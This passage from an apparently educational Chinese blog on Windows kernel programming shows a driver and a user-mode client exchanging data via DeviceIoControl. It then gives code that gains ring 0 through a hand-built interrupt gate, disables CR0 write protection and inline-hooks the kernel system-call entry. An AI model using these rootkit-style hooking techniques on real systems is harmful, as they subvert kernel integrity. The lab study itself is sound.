实验2：设备通信</h3><p>在编写驱动时，创建设备和对应的符号链接，然后在Ring3通过符号链接即可链接对应的设备。<br>驱动代码：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;ntddk.h></span>    </span><span class="token comment">// 定义设备名和驱动符号</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DEVICE_NAME</span> <span class="token expression">L</span><span class="token string">"\\Device\\Demo1"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SYMBOLICLINK_NAME</span> <span class="token expression">L</span><span class="token string">"\\??\\Demo1"</span></span><span class="token comment">// 定义 I/O 控制代码，只有 0x800-0xFFF 可用</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">OPER1</span> <span class="token expression"><span class="token function">CTL_CODE</span><span class="token punctuation">(</span>FILE_DEVICE_UNKNOWN<span class="token punctuation">,</span> <span class="token number">0x800</span><span class="token punctuation">,</span> METHOD_BUFFERED<span class="token punctuation">,</span> FILE_ANY_ACCESS<span class="token punctuation">)</span></span></span><span class="token comment">// 卸载驱动</span>NTSTATUS <span class="token function">UnloadDriver</span><span class="token punctuation">(</span>PDRIVER_OBJECT pDriObj<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    UNICODE_STRING SymbolicLinkName <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token function">DbgPrint</span><span class="token punctuation">(</span><span class="token string">"Unload Driver!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 删除符号和设备</span>    <span class="token function">RtlInitUnicodeString</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>SymbolicLinkName<span class="token punctuation">,</span> SYMBOLICLINK_NAME<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">IoDeleteSymbolicLink</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>SymbolicLinkName<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">IoDeleteDevice</span><span class="token punctuation">(</span>pDriObj<span class="token operator">-></span>DeviceObject<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> STATUS_SUCCESS<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// Ring3 创建设备对象时的处理函数</span>NTSTATUS <span class="token function">IrpCreateProc</span><span class="token punctuation">(</span>PDEVICE_OBJECT pDevObj<span class="token punctuation">,</span> PIRP pIrp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">DbgPrint</span><span class="token punctuation">(</span><span class="token string">"Open Device!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 设置返回状态</span>    pIrp<span class="token operator">-></span>IoStatus<span class="token punctuation">.</span>Status <span class="token operator">=</span> STATUS_SUCCESS<span class="token punctuation">;</span>    pIrp<span class="token operator">-></span>IoStatus<span class="token punctuation">.</span>Information <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">IoCompleteRequest</span><span class="token punctuation">(</span>pIrp<span class="token punctuation">,</span> IO_NO_INCREMENT<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> STATUS_SUCCESS<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 关闭设备对象时的处理函数</span>NTSTATUS <span class="token function">IrpCloseProc</span><span class="token punctuation">(</span>PDEVICE_OBJECT pDevObj<span class="token punctuation">,</span> PIRP pIrp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">DbgPrint</span><span class="token punctuation">(</span><span class="token string">"Close Device!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    pIrp<span class="token operator">-></span>IoStatus<span class="token punctuation">.</span>Status <span class="token operator">=</span> STATUS_SUCCESS<span class="token punctuation">;</span>    pIrp<span class="token operator">-></span>IoStatus<span class="token punctuation">.</span>Information <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">IoCompleteRequest</span><span class="token punctuation">(</span>pIrp<span class="token punctuation">,</span> IO_NO_INCREMENT<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> STATUS_SUCCESS<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 处理设备通信</span>NTSTATUS <span class="token function">IrpDeviceControlProc</span><span class="token punctuation">(</span>PDEVICE_OBJECT pDevObj<span class="token punctuation">,</span> PIRP pIrp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    NTSTATUS status <span class="token operator">=</span> STATUS_INVALID_DEVICE_REQUEST<span class="token punctuation">;</span>    PIO_STACK_LOCATION pIrpStack<span class="token punctuation">;</span>    ULONG uIoControlCode<span class="token punctuation">;</span>    PVOID pIoBuffer<span class="token punctuation">;</span>    ULONG uInLength<span class="token punctuation">;</span>    ULONG uOutLength<span class="token punctuation">;</span>    ULONG uRead<span class="token punctuation">;</span>    ULONG uWrite<span class="token operator">=</span><span class="token number">0xaabbccdd</span><span class="token punctuation">;</span>    <span class="token comment">// 获取堆栈地址</span>    pIrpStack <span class="token operator">=</span> <span class="token function">IoGetCurrentIrpStackLocation</span><span class="token punctuation">(</span>pIrp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 获取I/O控制码</span>    uIoControlCode <span class="token operator">=</span> pIrpStack<span class="token operator">-></span>Parameters<span class="token punctuation">.</span>DeviceIoControl<span class="token punctuation">.</span>IoControlCode<span class="token punctuation">;</span>    <span class="token comment">// 获取缓冲区地址</span>    pIoBuffer <span class="token operator">=</span> pIrp<span class="token operator">-></span>AssociatedIrp<span class="token punctuation">.</span>SystemBuffer<span class="token punctuation">;</span>    <span class="token comment">// 接收的数据长度</span>    uInLength <span class="token operator">=</span> pIrpStack<span class="token operator">-></span>Parameters<span class="token punctuation">.</span>DeviceIoControl<span class="token punctuation">.</span>InputBufferLength<span class="token punctuation">;</span>    <span class="token comment">// 要发送的数据长度</span>    uOutLength <span class="token operator">=</span> pIrpStack<span class="token operator">-></span>Parameters<span class="token punctuation">.</span>DeviceIoControl<span class="token punctuation">.</span>OutputBufferLength<span class="token punctuation">;</span>    <span class="token comment">//DbgPrint("The IOCTL is %x\n", uIoControlCode);</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>uIoControlCode <span class="token operator">==</span> OPER1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">DbgPrint</span><span class="token punctuation">(</span><span class="token string">"The IOCTL is %x\n"</span><span class="token punctuation">,</span> uIoControlCode<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">DbgPrint</span><span class="token punctuation">(</span><span class="token string">"IrpDeviceControlProc -> OPER1 接收字节数：%d \n"</span><span class="token punctuation">,</span> uInLength<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">DbgPrint</span><span class="token punctuation">(</span><span class="token string">"IrpDeviceControlProc -> OPER1 输出字节数：%d \n"</span><span class="token punctuation">,</span> uOutLength<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// Read From Buffer</span>        <span class="token function">RtlMoveMemory</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>uRead<span class="token punctuation">,</span> pIoBuffer<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">DbgPrint</span><span class="token punctuation">(</span><span class="token string">"IrpDeviceControlProc -> OPER1 ... %x \n"</span><span class="token punctuation">,</span> uRead<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// Write To Buffer</span>        <span class="token function">RtlMoveMemory</span><span class="token punctuation">(</span>pIoBuffer<span class="token punctuation">,</span> <span class="token operator">&amp;</span>uWrite<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// Set Status</span>        pIrp<span class="token operator">-></span>IoStatus<span class="token punctuation">.</span>Information <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>        status <span class="token operator">=</span> STATUS_SUCCESS<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    pIrp<span class="token operator">-></span>IoStatus<span class="token punctuation">.</span>Status <span class="token operator">=</span> status<span class="token punctuation">;</span>    <span class="token function">IoCompleteRequest</span><span class="token punctuation">(</span>pIrp<span class="token punctuation">,</span> IO_NO_INCREMENT<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> status<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>NTSTATUS <span class="token function">DriverEntry</span><span class="token punctuation">(</span>PDRIVER_OBJECT pDriver<span class="token punctuation">,</span> PUNICODE_STRING RegistryPath<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    NTSTATUS status <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    ULONG    uIndex <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    PDEVICE_OBJECT pDeviceObj <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    UNICODE_STRING Devicename<span class="token punctuation">;</span>    UNICODE_STRING SymbolicLinkName<span class="token punctuation">;</span>    <span class="token function">DbgPrint</span><span class="token punctuation">(</span><span class="token string">"Load Driver!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    pDriver<span class="token operator">-></span>DriverUnload <span class="token operator">=</span> UnloadDriver<span class="token punctuation">;</span>    <span class="token comment">// 创建设备</span>    <span class="token function">RtlInitUnicodeString</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Devicename<span class="token punctuation">,</span> DEVICE_NAME<span class="token punctuation">)</span><span class="token punctuation">;</span>    status <span class="token operator">=</span> <span class="token function">IoCreateDevice</span><span class="token punctuation">(</span>pDriver<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>Devicename<span class="token punctuation">,</span> FILE_DEVICE_UNKNOWN<span class="token punctuation">,</span> FILE_DEVICE_SECURE_OPEN<span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pDeviceObj<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>status <span class="token operator">!=</span> STATUS_SUCCESS<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">DbgPrint</span><span class="token punctuation">(</span><span class="token string">"Create Device Failed! \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> status<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">DbgPrint</span><span class="token punctuation">(</span><span class="token string">"Create Device Success! \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 设置数据交互方式</span>    pDeviceObj<span class="token operator">-></span>Flags <span class="token operator">|=</span> DO_BUFFERED_IO<span class="token punctuation">;</span>    <span class="token comment">// 创建符号链接</span>    <span class="token function">RtlInitUnicodeString</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>SymbolicLinkName<span class="token punctuation">,</span> SYMBOLICLINK_NAME<span class="token punctuation">)</span><span class="token punctuation">;</span>    status <span class="token operator">=</span> <span class="token function">IoCreateSymbolicLink</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>SymbolicLinkName<span class="token punctuation">,</span> <span class="token operator">&amp;</span>Devicename<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>status <span class="token operator">!=</span> STATUS_SUCCESS<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">DbgPrint</span><span class="token punctuation">(</span><span class="token string">"Create Symbols Failed! \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">IoDeleteDevice</span><span class="token punctuation">(</span>pDeviceObj<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> status<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">DbgPrint</span><span class="token punctuation">(</span><span class="token string">"Create Symbols Success! \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 设置处理函数</span>    pDriver<span class="token operator">-></span>MajorFunction<span class="token punctuation">[</span>IRP_MJ_CREATE<span class="token punctuation">]</span> <span class="token operator">=</span> IrpCreateProc<span class="token punctuation">;</span>    pDriver<span class="token operator">-></span>MajorFunction<span class="token punctuation">[</span>IRP_MJ_CLOSE<span class="token punctuation">]</span> <span class="token operator">=</span> IrpCloseProc<span class="token punctuation">;</span>    pDriver<span class="token operator">-></span>MajorFunction<span class="token punctuation">[</span>IRP_MJ_DEVICE_CONTROL<span class="token punctuation">]</span> <span class="token operator">=</span> IrpDeviceControlProc<span class="token punctuation">;</span>    <span class="token keyword">return</span> STATUS_SUCCESS<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Ring3代码（如果不使用宽字符的话，要将VS属性设置为多字符集）：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_CRT_SECURE_NO_WARNINGS</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;winioctl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IN_BUFFER_MAXLENGTH</span>  <span class="token expression"><span class="token number">0x10</span></span><span class="token comment">//输入缓存最大长度</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">OUT_BUFFER_MAXLENGTH</span> <span class="token expression"><span class="token number">0x10</span></span><span class="token comment">//输出缓存最大长度</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">OPER1</span> <span class="token expression"><span class="token function">CTL_CODE</span><span class="token punctuation">(</span>FILE_DEVICE_UNKNOWN<span class="token punctuation">,</span> <span class="token number">0x800</span><span class="token punctuation">,</span> METHOD_BUFFERED<span class="token punctuation">,</span> FILE_ANY_ACCESS<span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SYMBOLICLINK_NAME</span> <span class="token string">"\\\\.\\Demo1"</span></span>HANDLE g_hDevice<span class="token punctuation">;</span> <span class="token comment">// 驱动句柄</span><span class="token comment">// 创建设备对象</span>BOOL <span class="token function">Open</span><span class="token punctuation">(</span>PCHAR pLinkName<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> TCHAR szBuffer<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span> <span class="token comment">//在3环获取驱动程序</span> g_hDevice <span class="token operator">=</span> <span class="token function">CreateFile</span><span class="token punctuation">(</span>pLinkName<span class="token punctuation">,</span> GENERIC_READ <span class="token operator">|</span> GENERIC_WRITE<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> OPEN_EXISTING<span class="token punctuation">,</span> FILE_ATTRIBUTE_NORMAL<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> DWORD err <span class="token operator">=</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">sprintf</span><span class="token punctuation">(</span>szBuffer<span class="token punctuation">,</span> <span class="token string">"%d\n"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>g_hDevice <span class="token operator">!=</span> INVALID_HANDLE_VALUE<span class="token punctuation">)</span>  <span class="token keyword">return</span> TRUE<span class="token punctuation">;</span> <span class="token keyword">else</span>  <span class="token keyword">return</span> FALSE<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 设备通信函数</span>BOOL <span class="token function">IoControl</span><span class="token punctuation">(</span>DWORD dwIoCode<span class="token punctuation">,</span> PVOID InBuff<span class="token punctuation">,</span> DWORD InBuffLen<span class="token punctuation">,</span> PVOID OutBuff<span class="token punctuation">,</span> DWORD OutBuffLen<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> DWORD dw<span class="token punctuation">;</span> <span class="token comment">//驱动句柄/操作码/输入缓冲区地址/输入缓冲区长度/输出缓冲区地址/输出缓冲区长度/返回长度/指向OVERLAPPED 此处为NULL</span> <span class="token function">DeviceIoControl</span><span class="token punctuation">(</span>g_hDevice<span class="token punctuation">,</span> dwIoCode<span class="token punctuation">,</span> InBuff<span class="token punctuation">,</span> InBuffLen<span class="token punctuation">,</span> OutBuff<span class="token punctuation">,</span> OutBuffLen<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dw<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span> TRUE<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> DWORD dwInBuffer <span class="token operator">=</span> <span class="token number">0x11223344</span><span class="token punctuation">;</span> DWORD szOutBuffer <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token function">Open</span><span class="token punctuation">(</span>SYMBOLICLINK_NAME<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">IoControl</span><span class="token punctuation">(</span>OPER1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dwInBuffer<span class="token punctuation">,</span> IN_BUFFER_MAXLENGTH<span class="token punctuation">,</span> <span class="token operator">&amp;</span>szOutBuffer<span class="token punctuation">,</span> OUT_BUFFER_MAXLENGTH<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span> szOutBuffer<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//3. 关闭设备</span> <span class="token function">CloseHandle</span><span class="token punctuation">(</span>g_hDevice<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/3-7.png" alt="3-7"></p><h3 id="1-4-实验3：中断门实现Inline-Hook"><a href="#1-4-实验3：中断门实现Inline-Hook" class="headerlink" title="1.4 实验3：中断门实现Inline Hook"></a>1.4 实验3：中断门实现Inline Hook</h3><p>通过构造中断门提权后修改特定的API函数入口跳转到我们构造的Hook函数，执行完操作后恢复现场返回到API入口的下一行继续执行。<br>本实验以ntkrnlpa.exe中的KiFastEntry函数为例，使用Xuetr查看模块地址后在IDA中修改基址然后就可以进行分析了。<br><img src="/images/3-1.png" alt="3-1"><br><img src="/images/3-2.png" alt="3-2"><br>首先在内存中写入构造的Hook函数，这里使用GDT中的空闲表项地址，实现了一个API调用计数器的简单功能：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h></span></span><span class="token keyword">char</span><span class="token operator">*</span> g_hookAddr<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">Hook</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 向Hook函数地址写入字节码</span><span class="token keyword">void</span> <span class="token function">_declspec</span><span class="token punctuation">(</span>naked<span class="token punctuation">)</span> <span class="token function">IdtEntry</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> g_hookAddr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x8003f120</span><span class="token punctuation">;</span> <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">64</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token operator">*</span>g_hookAddr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>Hook<span class="token punctuation">)</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>  g_hookAddr<span class="token operator">++</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> _asm <span class="token punctuation">&#123;</span>  iretd <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">_declspec</span><span class="token punctuation">(</span>naked<span class="token punctuation">)</span> <span class="token function">Hook</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> _asm <span class="token punctuation">&#123;</span>  pushad  pushfd  mov eax<span class="token punctuation">,</span> ds<span class="token operator">:</span><span class="token punctuation">[</span><span class="token number">0x8003f180</span><span class="token punctuation">]</span>  inc eax  mov ds <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">0x8003f180</span><span class="token punctuation">]</span><span class="token punctuation">,</span> eax  popfd  popad  mov ecx<span class="token punctuation">,</span> <span class="token number">0x23</span>  push <span class="token number">0x30</span>  pop fs  mov ds<span class="token punctuation">,</span> cx  mov es<span class="token punctuation">,</span> cx  movecx<span class="token punctuation">,</span> <span class="token number">0x8053E54D</span>  jmp ecx <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">go</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> _asm <span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> <span class="token number">0x20</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span>IdtEntry <span class="token operator">!=</span> <span class="token number">0x401040</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Wrong Address!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token function">go</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后是修改API函数入口，将其指向跳转到Hook函数的地址：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h></span></span><span class="token comment">// 设置Hook</span><span class="token keyword">void</span> <span class="token function">_declspec</span><span class="token punctuation">(</span>naked<span class="token punctuation">)</span> <span class="token function">IdtEntry</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> _asm <span class="token punctuation">&#123;</span>  <span class="token comment">// 关闭写保护</span>  mov eax<span class="token punctuation">,</span> cr0  and eax<span class="token punctuation">,</span> not <span class="token number">0x10000</span>  mov cr0<span class="token punctuation">,</span> eax  <span class="token comment">// 构造跳转</span>  mov al<span class="token punctuation">,</span> <span class="token number">0xe9</span>  mov ds<span class="token operator">:</span><span class="token punctuation">[</span><span class="token number">0x8053E540</span><span class="token punctuation">]</span><span class="token punctuation">,</span> al  mov eax<span class="token punctuation">,</span> <span class="token number">0xFFB00BDB</span>  mov ds<span class="token operator">:</span><span class="token punctuation">[</span><span class="token number">0x8053E541</span><span class="token punctuation">]</span><span class="token punctuation">,</span> eax  <span class="token comment">// 初始化计数器</span>  xor eax<span class="token punctuation">,</span> eax  mov ds<span class="token operator">:</span><span class="token punctuation">[</span><span class="token number">0x8003f180</span><span class="token punctuation">]</span><span class="token punctuation">,</span> eax  <span class="token comment">// 恢复写保护</span>  mov eax<span class="token punctuation">,</span> cr0  or eax<span class="token punctuation">,</span> <span class="token number">0x10000</span>  mov cr0<span class="token punctuation">,</span> eax  iretd <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">go</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> _asm <span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> <span class="token number">0x20</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span>IdtEntry <span class="token operator">!=</span> <span class="token number">0x401040</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Wrong Address!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token function">go</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" 